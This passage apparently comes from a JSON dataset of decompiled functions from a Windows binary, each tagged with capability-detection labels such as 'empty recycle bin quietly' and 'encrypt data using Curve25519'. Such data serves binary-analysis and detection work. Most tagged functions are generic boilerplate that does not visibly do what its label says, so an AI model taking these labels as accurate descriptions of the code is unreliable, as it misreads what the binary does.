uStack116;\n    uint *puStack108;\n    uint uStack104;\n    int32_t *piStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint32_t uStack84;\n    uchar *puStack80;\n    uint32_t uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uchar auStack52 [12];\n    uint var_30h_2;\n    uint var_30h;\n    uint uStack24;\n    uchar *puStack20;\n    uchar *puStack16;\n    uint32_t uStack12;\n    uint32_t var_10h_4;\n    uint var_10h_2;\n    \n    puStack108 = &fcn.0042c9d0::var_10h_2;\n    uStack12 = var_4h[1];\n    if (uStack12 != 0) {\n        puVar3 = var_4h + 3;\n        uVar2 = uStack12;\n        do {\n            uVar1 = *puVar3;\n            if ((uVar1 & 0x80) == 0) {\n                if (uVar1 == 0xc) {\n                    var_8h_2 = var_8h_2 + 0x10;\n                }\n                else {\n                    if ((uVar1 < 5) || (7 < uVar1)) goto code_r0x0042ca27;\n                    var_8h_2 = var_8h_2 + 8;\n                }\n            }\n            else {\ncode_r0x0042ca27:\n                var_8h_2 = var_8h_2 + 4;\n            }\n            puVar3 = puVar3 + 1;\n            uVar2 = uVar2 - 1;\n            unaff_ESI = var_8h_2;\n        } while (uVar2 != 0);\n    }\n    puStack128 = var_4h;\n    puStack20 = &stack0xffffffc0;\n    var_10h_4 = var_4h[2];\n    iStack132 = unaff_ESI;\n    for (uVar2 = var_10h_4; uVar2 != 0; uVar2 = uVar2 - 1) {\n        iStack132 = var_4h_2;\n    }\n    uStack76 = *var_4h;\n    if ((uStack76 == 4) && ((var_10h_4 = var_10h_4 + 1,  var_4h[3] == 9 || (var_4h[3] == 0xd)))) {\n        uStack76 = 8;\n    }\n    puStack16 = &stack0xffffffc0;\n    uStack68 = 0;\n    puStack72 = &stack0xffffffcc;\n    puStack80 = NULL;\n    uStack84 = 0x42ca7b;\n    fcn.0042c9c0();\n    uStack84 = uStack76;\n    uStack76 = var_10h_5;\n    uStack88 = puStack80;\n    uStack92 = 0x492a44;\n    uStack96 = noname_2;\n    piStack100 = noname_0;\n    uStack104 = 0x42ca97;\n    puStack80 = &stack0xffffffec;\n    arg_ch_00 = (**(*noname_0 + 0x18))();\n    if (arg_ch_00 == 0) {\n        return;\n    }\n    puStack172 = &stack0xffffffcc;\n    uStack104 = CONCAT31(extraout_ECX >> 8, 1);\n    puStack136 = &stack0xffffff94;\n    uStack116 = 0;\n    uStack120 = 0;\n    uStack124 = 0;\n    uStack140 = 0x42c9a5;\n    uStack144 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff70;\n    if (arg_ch_00 == -0x7ffdfff7) {\n        puStack136 = &stack0xffffff94;\n        puStack108 = &fcn.0042c9d0::var_10h_2;\n        fcn.004057d4();\n        arg_10h = uStack116;\n        fcn.004057d4();\n        puStack164 = 0x42c938;\n        arg_ch_01 = uStack120;\n        fcn.004057d4();\n        puStack164 = 0x42c947;\n        iStack168 = fcn.0042bc78(var_30h, arg_ch_01, arg_10h, uStack24);\n        if (piStack100 != '\\0') {\n            puStack164 = 0x42c95c;\n            fcn.004061e4();\n        }\n    }\n    else {\n        arg_10h = 0;\n        iStack168 = fcn.0042bba4(0, arg_ch_00);\n    }\n    if (var_ch != 0) {\n        iStack176 = iStack168;\n        if (iStack168 == 0) {\n            iStack176 = fcn.00405470();\n        }\n        puStack164 = &stack0xffffffc0;\n    // WARNING: Could not recover jumptable at 0x00404ee5. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x496014)(0xeedfade, 1, 7, &stack0xffffff4c);\n        return;\n    }\n    fcn.00404ec4();\n    *in_FS_OFFSET = arg_10h;\n    uStack144 = 0x42c9ac;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1689
    },
    "0047149c": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid fcn.0047149c(void)\n\n{\n    uint in_EAX;\n    \n    fcn.00405584();\n    // switch table (8 cases) at 0x4714be\n    switch(in_EAX) {\n    case 1:\n        fcn.00405584();\n        return;\n    case 2:\n        fcn.00405584();\n        return;\n    case 3:\n        fcn.00405584();\n        return;\n    case 4:\n        fcn.00405584();\n        return;\n    case 5:\n        fcn.00405584();\n        return;\n    case 6:\n        fcn.00405584();\n        break;\n    case 7:\n        fcn.00405584();\n        return;\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "00485e60": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00485e60(uint param_1, uchar param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x104) = param_2;\n    // switch table (8 cases) at 0x485e77\n    switch(param_2) {\n    default:\n        *(in_EAX + 0x104) = 3;\n        *(in_EAX + 0x6c) = 4;\n        return;\n    case 1:\n        *(in_EAX + 0x6c) = 0x20;\n        return;\n    case 2:\n        *(in_EAX + 0x6c) = 8;\n        return;\n    case 3:\n        *(in_EAX + 0x6c) = 4;\n        return;\n    case 5:\n        *(in_EAX + 0x6c) = 2;\n        return;\n    case 7:\n        *(in_EAX + 0x6c) = 1;\n        return;\n    }\n}\n",
        "token_count": 232
    },
    "004100b8": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004100b8(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x410112;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004057d4();\n        fcn.00409f38();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x410119;\n    uStack20 = 0x410111;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 191
    },
    "00410124": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410124(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x41017e;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004057d4();\n        fcn.0040b7cc();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x410185;\n    uStack20 = 0x41017d;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 193
    },
    "00410190": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410190(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x4101ea;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004057d4();\n        fcn.0040b7a0();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x4101f1;\n    uStack20 = 0x4101e9;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 197
    },
    "004101fc": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004101fc(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x410256;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004057d4();\n        fcn.0040d254();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41025d;\n    uStack20 = 0x410255;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 191
    },
    "00410268": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410268(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x4102c2;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004057d4();\n        fcn.0040b7f8();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x4102c9;\n    uStack20 = 0x4102c1;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 198
    },
    "00411f68": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.00411f68(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x41200b;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    fcn.0041516c();\n    uVar3 = var_4h;\n    iVar2 = (***0x495cc8)(var_4h, 0x400, 0, &var_8h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004057d4();\n        cVar1 = fcn.00409f38();\n        if (cVar1 == '\\0') {\n            var_8h = fcn.004131c8();\n            var_8h = var_8h & 0x7f;\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.004112a0();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00405530(0x412012);\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 332
    },
    "0041296c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint64_t fcn.0041296c(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint uStack44;\n    uint uStack40;\n    int32_t iStack36;\n    uchar *puStack32;\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    puStack32 = &stack0xffffffec;\n    iStack36 = 0x41297c;\n    sub.oleaut32.dll_VariantInit();\n    iStack36 = 3;\n    uStack40 = 0;\n    uStack44 = 0x400;\n    iVar1 = (***0x495be4)(&stack0xffffffe8);\n    if (iVar1 == 0) {\n        uVar3 = iStack36;\n    }\n    else {\n        iVar1 = (***0x495be4)(&stack0xffffffd4);\n        if (iVar1 == 0) {\n            uVar3 = fcn.00403450();\n        }\n        else if (iVar1 == -0x7ffdfffb) {\n            uVar2 = fcn.004131c8();\n            uVar3 = uVar2 & 0x7f;\n        }\n        else {\n            fcn.004112a0();\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 304
    },
    "00412a18": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00412a18(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack52 = 0x412b06;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    fcn.0041516c();\n    fcn.004057d4();\n    cVar1 = fcn.00409f58();\n    if (cVar1 == '\\0') {\n        iVar2 = (***0x495cc8)(var_4h, 0x400, 0, &fcn.00412a18::var_14h);\n        if (iVar2 == 0) {\n            _var_10h = var_14h;\n        }\n        else {\n            iVar2 = (***0x495abc)(var_4h, 0x400, 0, &fcn.00412a18::var_20h);\n            if (iVar2 == 0) {\n                _var_10h = fcn.00403450();\n            }\n            else if (iVar2 == -0x7ffdfffb) {\n                uVar3 = fcn.004131c8();\n                _var_10h = uVar3 & 0x7f;\n            }\n            else {\n                fcn.004112a0();\n                _var_10h = 0;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x412b0d;\n    uStack52 = 0x412afd;\n    fcn.00405530();\n    uStack52 = 0x412b05;\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 480
    },
    "004169c8": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004169c8(float arg_8h, float arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_EAX;\n    uint8_t *puVar2;\n    int32_t in_EDX;\n    double *pdVar3;\n    code *var_8h;\n    uint var_4h;\n    \n    var_8h = *(in_EDX + 8);\n    puVar2 = fcn.004164f0();\n    uVar1 = *puVar2;\n    if ((var_8h & 0xff000000) == 0xff000000) {\n        pdVar3 = (var_8h & 0xffffff) + in_EAX;\n    // switch table (5 cases) at 0x416a11\n        switch(uVar1 & 0x7f) {\n        case 0:\n            *pdVar3 = CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h));\n            break;\n        case 1:\n            *pdVar3 = CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h));\n            break;\n        case 2:\n            *pdVar3 = arg_8h;\n            *(pdVar3 + 4) = arg_ch;\n            *(pdVar3 + 1) = arg_10h;\n            break;\n        case 3:\n            *pdVar3 = ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n            break;\n        case 4:\n            *pdVar3 = ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x416bbc);\n        }\n    }\n    else {\n        if ((var_8h & 0xff000000) == 0xfe000000) {\n            var_8h = *(*in_EAX + var_8h);\n        }\n        if (*(in_EDX + 0x10) == -0x80000000) {\n    // switch table (5 cases) at 0x416aad\n            switch(uVar1 & 0x7f) {\n            case 0:\n                (*var_8h)();\n                break;\n            case 1:\n                (*var_8h)(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n                break;\n            case 2:\n                (*var_8h)(arg_8h, arg_ch, arg_10h);\n                break;\n            case 3:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h))));\n                break;\n            case 4:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x416bbc));\n            }\n        }\n        else {\n    // switch table (5 cases) at 0x416b40\n            switch(uVar1 & 0x7f) {\n            case 0:\n                (*var_8h)();\n                break;\n            case 1:\n                (*var_8h)(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n                break;\n            case 2:\n                (*var_8h)(arg_8h, arg_ch, arg_10h);\n                break;\n            case 3:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h))));\n                break;\n            case 4:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x416bbc));\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 810
    },
    "0041bb7c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0041bb7c(uint arg_8h, uint arg_ch)\n\n{\n    ulong uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0040a224(arg_8h, arg_ch);\n    return uVar1;\n}\n",
        "token_count": 71
    },
    "0041daf0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041daf0(uint param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.0041eb6c(param_1);\n    // switch table (14 cases) at 0x41db26\n    switch(uVar1 & 0x7f) {\n    case 0:\n        fcn.00405584();\n        break;\n    default:\n        fcn.0041ca14();\n        break;\n    case 7:\n        fcn.0041d004();\n        fcn.00405620();\n        fcn.00405a3c();\n        fcn.0041d004();\n        break;\n    case 8:\n        fcn.00405584();\n        break;\n    case 9:\n        fcn.00405584();\n        break;\n    case 0xd:\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 199
    },
    "0041ec7c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.0041ec7c(void)\n\n{\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack20 = 0x41ee21;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uVar1 = fcn.0041eb6c();\n    // switch table (22 cases) at 0x41ecb3\n    switch(uVar1 & 0x7f) {\n    case 1:\n        fcn.0041ebc8(&stack0xfffffffc);\n        break;\n    case 2:\n        fcn.0041f088();\n        break;\n    case 3:\n        fcn.0041f088();\n        break;\n    case 4:\n        fcn.0041f088();\n        break;\n    case 5:\n        fcn.0041f088();\n        break;\n    case 6:\n    case 7:\n        fcn.0041e990();\n        break;\n    case 10:\n        fcn.0041ebf0(&stack0xfffffffc);\n        break;\n    case 0xb:\n        fcn.0041eb80();\n        break;\n    case 0xc:\n        fcn.0041ebf0(&stack0xfffffffc);\n        break;\n    case 0xe:\n        fcn.0041ec20(&stack0xfffffffc);\n        break;\n    case 0xf:\n        fcn.0041f088();\n        break;\n    case 0x10:\n        fcn.0041f088();\n        break;\n    case 0x11:\n        fcn.0041f088();\n        break;\n    case 0x12:\n        fcn.0041ebf0(&stack0xfffffffc);\n        break;\n    case 0x13:\n        fcn.0041f088();\n        break;\n    case 0x14:\n        fcn.0041ebf0(&stack0xfffffffc);\n        break;\n    case 0x15:\n        fcn.0041f088();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41ee28;\n    uStack20 = 0x41ee20;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 551
    },
    "0041f298": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.0041f298(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    ulong uVar3;\n    uint in_stack_ffffffc8;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x41f4aa;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.00411644();\n    uVar2 = fcn.0041cfe0();\n    // switch table (22 cases) at 0x41f2da\n    switch(uVar2 & 0x7f) {\n    case 0:\n    case 0xd:\n        cVar1 = fcn.0041eb6c();\n        if (cVar1 != '\\r') {\n            fcn.0041632c();\n        }\n        break;\n    default:\n        fcn.0040dbc0();\n        fcn.00404ec4();\n        break;\n    case 2:\n        fcn.0041dbec();\n        fcn.004158b0();\n        break;\n    case 3:\n        fcn.0041dbec();\n        fcn.004158b0();\n        break;\n    case 4:\n        fcn.0041dbec();\n        fcn.004158b0();\n        break;\n    case 5:\n        fcn.0041d99c();\n        fcn.00415aa8();\n        break;\n    case 6:\n    case 0xc:\n        fcn.0041e9cc();\n        fcn.00415ae4();\n        break;\n    case 8:\n    case 9:\n        fcn.0041eb6c();\n        fcn.00415a80();\n        break;\n    case 10:\n        in_stack_ffffffc8 = 0x41f44d;\n        fcn.0041f0d0(&stack0xfffffffc);\n        fcn.00411a70();\n        break;\n    case 0xf:\n        fcn.0041da18();\n        fcn.00415aa8();\n        break;\n    case 0x10:\n        fcn.0041da5c();\n        fcn.00415ad0();\n        break;\n    case 0x11:\n        fcn.0041daac();\n        fcn.00415abc();\n        break;\n    case 0x12:\n    case 0x14:\n        fcn.0041ea88();\n        fcn.00415b10();\n        break;\n    case 0x13:\n        uVar3 = fcn.0041dc58();\n        in_stack_ffffffc8 = uVar3;\n        fcn.004159ac(in_stack_ffffffc8, uVar3 >> 0x20);\n        break;\n    case 0x15:\n        fcn.0041d9d4();\n        fcn.00415aa8();\n    }\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    uStack48 = 0x41f4b1;\n    fcn.00411658();\n    fcn.00405d28();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 747
    },
    "004322f8": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.004322f8(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    do {\n        iVar1 = *(in_EAX + 8 + (uVar2 & 0x7f) * 4);\n        if (iVar1 != 0) {\n            (***0x495a58)(iVar1);\n            *(in_EAX + 8 + (uVar2 & 0x7f) * 4) = 0;\n        }\n        uVar2 = uVar2 + 1;\n    } while (uVar2 != '\\x18');\n    return;\n}\n",
        "token_count": 154
    },
    "00432434": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00432434(uchar *param_1, uint32_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    *param_1 = 3;\n    uVar1 = param_2 - 2;\n    if (uVar1 < 7) {\n        *(param_1 + 4) = 1;\n        iVar2 = 2;\n    }\n    else if (uVar1 == 7) {\n        *(param_1 + 4) = 2;\n        iVar2 = 9;\n    }\n    else {\n        *(param_1 + 4) = 0;\n        iVar2 = 0;\n    }\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar2) + 1;\n    return;\n}\n",
        "token_count": 187
    },
    "00432470": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00432470(uchar *param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 10;\n    // switch table (18 cases) at 0x43249b\n    switch(param_2 & 0xff) {\n    default:\n        *(param_1 + 4) = 0;\n        iVar1 = 0;\n        break;\n    case 2:\n        *(param_1 + 4) = 1;\n        iVar1 = 2;\n        break;\n    case 3:\n        *(param_1 + 4) = 2;\n        iVar1 = 3;\n        break;\n    case 4:\n    case 5:\n    case 6:\n    case 7:\n    case 8:\n    case 9:\n        *(param_1 + 4) = 3;\n        iVar1 = 4;\n        break;\n    case 10:\n    case 0xb:\n    case 0xc:\n    case 0xd:\n        *(param_1 + 4) = 4;\n        iVar1 = 10;\n        break;\n    case 0xe:\n    case 0xf:\n    case 0x10:\n    case 0x11:\n        *(param_1 + 4) = 5;\n        iVar1 = 0xe;\n    }\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar1) + 1;\n    return;\n}\n",
        "token_count": 332
    },
    "0043250c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043250c(uchar *param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 0x17;\n    // switch table (105 cases) at 0x432592\n    switch(param_2 & 0xff) {\n    default:\n        *(param_1 + 4) = 0;\n        iVar1 = 0;\n        break;\n    case 2:\n    case 3:\n    case 4:\n        *(param_1 + 4) = 1;\n        iVar1 = 2;\n        break;\n    case 5:\n    case 6:\n    case 7:\n        *(param_1 + 4) = 2;\n        iVar1 = 5;\n        break;\n    case 8:\n    case 9:\n    case 10:\n        *(param_1 + 4) = 3;\n        iVar1 = 8;\n        break;\n    case 0xb:\n    case 0xc:\n    case 0xd:\n        *(param_1 + 4) = 4;\n        iVar1 = 0xb;\n        break;\n    case 0xe:\n    case 0xf:\n    case 0x10:\n        *(param_1 + 4) = 5;\n        iVar1 = 0xe;\n        break;\n    case 0x11:\n    case 0x12:\n    case 0x13:\n        *(param_1 + 4) = 6;\n        iVar1 = 0x11;\n        break;\n    case 0x14:\n    case 0x15:\n        *(param_1 + 4) = 7;\n        iVar1 = 0x14;\n        break;\n    case 0x16:\n    case 0x17:\n        *(param_1 + 4) = 8;\n        iVar1 = 0x16;\n        break;\n    case 0x18:\n    case 0x19:\n        *(param_1 + 4) = 9;\n        iVar1 = 0x18;\n        break;\n    case 0x1a:\n    case 0x1b:\n        *(param_1 + 4) = 10;\n        iVar1 = 0x1a;\n        break;\n    case 0x1c:\n    case 0x1d:\n        *(param_1 + 4) = 0xb;\n        iVar1 = 0x1c;\n        break;\n    case 0x1e:\n    case 0x1f:\n        *(param_1 + 4) = 0xc;\n        iVar1 = 0x1e;\n        break;\n    case 0x20:\n    case 0x21:\n    case 0x22:\n    case 0x23:\n        *(param_1 + 4) = 0xd;\n        iVar1 = 0x20;\n        break;\n    case 0x24:\n    case 0x25:\n    case 0x26:\n    case 0x27:\n        *(param_1 + 4) = 0xe;\n        iVar1 = 0x24;\n        break;\n    case 0x28:\n    case 0x29:\n    case 0x2a:\n    case 0x2b:\n        *(param_1 + 4) = 0xf;\n        iVar1 = 0x28;\n        break;\n    case 0x2c:\n    case 0x2d:\n    case 0x2e:\n    case 0x2f:\n        *(param_1 + 4) = 0x10;\n        iVar1 = 0x2c;\n        break;\n    case 0x30:\n    case 0x31:\n    case 0x32:\n    case 0x33:\n        *(param_1 + 4) = 0x11;\n        iVar1 = 0x30;\n        break;\n    case 0x34:\n    case 0x35:\n    case 0x36:\n    case 0x37:\n        *(param_1 + 4) = 0x12;\n        iVar1 = 0x34;\n        break;\n    case 0x38:\n    case 0x39:\n    case 0x3a:\n    case 0x3b:\n        *(param_1 + 4) = 0x13;\n        iVar1 = 0x38;\n        break;\n    case 0x3c:\n    case 0x3d:\n    case 0x3e:\n    case 0x3f:\n        *(param_1 + 4) = 0x14;\n        iVar1 = 0x3c;\n        break;\n    case 0x40:\n    case 0x41:\n    case 0x42:\n    case 0x43:\n        *(param_1 + 4) = 0x15;\n        iVar1 = 0x40;\n        break;\n    case 0x44:\n    case 0x45:\n    case 0x46:\n    case 0x47:\n        *(param_1 + 4) = 0x16;\n        